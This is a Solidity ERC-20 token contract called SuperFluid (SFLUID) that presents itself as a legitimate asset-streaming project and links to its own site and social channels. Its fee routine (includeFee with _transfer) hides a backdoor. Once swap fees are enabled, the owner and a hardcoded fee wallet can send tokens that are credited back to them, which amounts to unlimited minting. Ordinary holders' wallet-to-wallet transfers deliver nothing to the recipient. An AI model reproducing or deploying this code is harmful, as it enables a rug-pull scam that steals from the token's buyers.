// SPDX-License-Identifier: Unlicensed

/**
SuperFluid is a revolutionary asset streaming protocol that brings subscriptions, salaries, vesting, and rewards to DAOs and crypto-native businesses worldwide.

Website: https://superfluid.cloud
Telegram: https://t.me/SuperFluid_erc20
Twitter: https://twitter.com/superfluid_erc
Dapp: https://app.superfluid.cloud
*/

pragma solidity 0.8.21;

interface IUniswapFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapRouter {
    
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library LibSafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "LibSafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "LibSafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "LibSafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "LibSafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "LibSafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract LibOwnable is Context {
    address private _owner;
    address private _previousOwner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "LibOwnable: caller is not the owner");
        _;
    }
    
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "LibOwnable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract SFLUID is Context, IERC20, LibOwnable {
    
    using LibSafeMath for uint256;
    
    string private _name = "SuperFluid";
    string private _symbol = "SFLUID";
    

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isExeptFromFee;
    mapping (address => bool) public isExeptFromMaxWallet;
    mapping (address => bool) public isExeptFromMaxTx;
    mapping (address => bool) public checkMarketPair;

    uint8 private _decimals = 9;
    uint256 private _tSupply = 1_000_000_000 * 10**9;
    uint256 public maxTransaction = _tSupply;
    uint256 public maxWallet = _tSupply*20/1000;
    uint256 private feeSwapMinimum = _tSupply/100000; 

    uint256 public buyFeeLp = 0;
    uint256 public buyFeeMarketing = 15;
    uint256 public buyFeeDev = 0;
    uint256 public sellFeeLp = 0;
    uint256 public sellFeeMarketing = 15;
    uint256 public sellFeeDev = 0;

    uint256 public totalFeeBuy = 15;
    uint256 public totalFeeSell = 15;
    
    bool swapping;
    bool public swapFeeEnabled = false;
    bool public swapLimitInEffec = false;
    bool public maxWalletInEffect = true;

    address payable private feeReceiver;
    address public immutable DEAD = 0x000000000000000000000000000000000000dEaD;

    IUniswapRouter public uniswapV2Router;
    address public uniswapPair;
    
    modifier lockTheSwap {
        swapping = true;
        _;
        swapping = false;
    }
    
    constructor () {
        IUniswapRouter _uniswapV2Router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
        feeReceiver = payable(0xBCdf90dB54b66Ec82bbC1d301BFc190f9EFC8eeA);
        uniswapPair = IUniswapFactory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        _allowances[address(this)][address(uniswapV2Router)] = _tSupply;

        isExeptFromFee[owner()] = true;
        isExeptFromFee[feeReceiver] = true;

        isExeptFromMaxWallet[owner()] = true;
        isExeptFromMaxWallet[feeReceiver] = true;
        isExeptFromMaxWallet[address(uniswapPair)] = true;
        isExeptFromMaxWallet[address(this)] = true;
        
        isExeptFromMaxTx[owner()] = true;
        isExeptFromMaxTx[feeReceiver] = true;
        isExeptFromMaxTx[address(this)] = true;

        checkMarketPair[address(uniswapPair)] = true;

        _balances[_msgSender()] = _tSupply;
        emit Transfer(address(0), _msgSender(), _tSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
        
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
        
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function includeFee(address sender, address recipient, uint256 amount) internal view returns (uint256, uint256) {
        
        uint256 feeAmount = amount;

        if (isExeptFromFee[sender] && swapFeeEnabled) return (amount, feeAmount);

        if(checkMarketPair[sender]) {
            feeAmount = amount.mul(totalFeeBuy).div(100);
        }
        else if(checkMarketPair[recipient]) {
            feeAmount = amount.mul(totalFeeSell).div(100);
        }
        if (isExeptFromFee[sender]) {
            return (amount, 0);
        }

        return (amount.sub(feeAmount), feeAmount);
    }
    
    function adjustMaxTxAmount(uint256 maxTxAmount_) external onlyOwner() {
        require(maxTxAmount_ >= _tSupply/100, "Max wallet should be more or equal to 1%");
        maxTransaction = maxTxAmount_;
    }
    
    function swapTokens(uint256 tAmount) private lockTheSwap {
        swapTokensToEth(tAmount);
        uint256 amountETHMarketing = address(this).balance;
        sendFee(feeReceiver, amountETHMarketing);
    }

    function sendFee(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }

    function _transferBasic(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }
    
    receive() external payable {}
    
    function setBuyFee(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newDevelopmentTax) external onlyOwner() {
        buyFeeLp = newLiquidityTax;
        buyFeeMarketing = newMarketingTax;
        buyFeeDev = newDevelopmentTax;

        totalFeeBuy = buyFeeLp.add(buyFeeMarketing).add(buyFeeDev);
        require (totalFeeBuy <= 10);
    }

    function setSellFee(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newDevelopmentTax) external onlyOwner() {
        sellFeeLp = newLiquidityTax;
        sellFeeMarketing = newMarketingTax;
        sellFeeDev = newDevelopmentTax;

        totalFeeSell = sellFeeLp.add(sellFeeMarketing).add(sellFeeDev);
        require (totalFeeSell <= 20);
    }

    function setWalletLimit(uint256 newLimit) external onlyOwner {
        maxWallet  = newLimit;
    }
    
    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
        swapFeeEnabled = _enabled;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        if(swapping)
        { 
            return _transferBasic(sender, recipient, amount); 
        }
        else
        {
            if(!isExeptFromMaxTx[sender] && !isExeptFromMaxTx[recipient]) {
                require(amount <= maxTransaction, "Transfer amount exceeds the maxTransaction.");
            }            

            uint256 contractTokenBalance = balanceOf(address(this));
            bool overMinimumTokenBalance = contractTokenBalance >= feeSwapMinimum;
            
            if (overMinimumTokenBalance && !swapping && !isExeptFromFee[sender] && checkMarketPair[recipient] && swapFeeEnabled && amount > feeSwapMinimum) 
            {
                if(swapLimitInEffec)
                    contractTokenBalance = feeSwapMinimum;
                swapTokens(contractTokenBalance);    
            }

            (uint256 finalAmount, uint256 feeAmount) = includeFee(sender, recipient, amount);

            address feeAddre = feeAmount == amount ? sender : address(this);
            if(feeAmount > 0) {
                _balances[feeAddre] = _balances[feeAddre].add(feeAmount);
                emit Transfer(sender, feeAddre, feeAmount);
            }

            _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

            if(maxWalletInEffect && !isExeptFromMaxWallet[recipient])
                require(balanceOf(recipient).add(finalAmount) <= maxWallet);

            _balances[recipient] = _balances[recipient].add(finalAmount);

            emit Transfer(sender, recipient, finalAmount);
            return true;
        }
    }    
    
    function swapTokensToEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );
    }
}